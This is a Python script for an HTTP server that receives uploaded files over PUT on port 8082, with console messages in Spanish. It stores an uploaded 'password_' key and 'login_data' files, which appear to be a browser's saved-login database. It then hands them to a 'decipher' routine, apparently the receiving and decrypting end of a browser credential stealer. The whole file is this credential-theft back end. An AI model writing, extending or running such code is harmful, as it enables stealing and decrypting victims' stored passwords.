import threading
import os
from decipher import main
from http.server import SimpleHTTPRequestHandler, HTTPServer


class UploadHandler(SimpleHTTPRequestHandler):
     timer = None
     password = None
     db = []
     def do_PUT(self):
        print("Received PUT request")
        filepath = self.path.strip("/dbs/")
        print(f"Saving file to: {filepath}")

        try:
            content_length = int(self.headers['Content-Length'])
            data = self.rfile.read(content_length)
            #f.write(data)
            if "password_" in self.path:
               UploadHandler.password = data
               print(f"password uploaded")
            elif "login_data" in self.path:
                with open(filepath,'wb') as f:
                 f.write(data)
                UploadHandler.db.append(filepath)
            else:
                pass
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            if UploadHandler.timer:
               UploadHandler.timer.cancel()

            UploadHandler.timer = threading.Timer(3.0, stop_server)
            UploadHandler.timer.start()

        except Exception as e:
            print(f"Error saving file: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Internal Server Error")
     @classmethod
     def get_pass(cls):
         return cls.password

     @classmethod
     def get_db(cls):
         return cls.db

def stop_server():
    print("Tiempo de espera agotado")
    httpd.shutdown()
    key = UploadHandler.get_pass()
    dbs = UploadHandler.get_db()
    print(dbs)
    for db in dbs:
       #print(db)
       main(key,db)

server_address = ('', 8082)
httpd = HTTPServer(server_address, UploadHandler)
print("Escuchando por el puerto 8082...")
httpd.serve_forever()
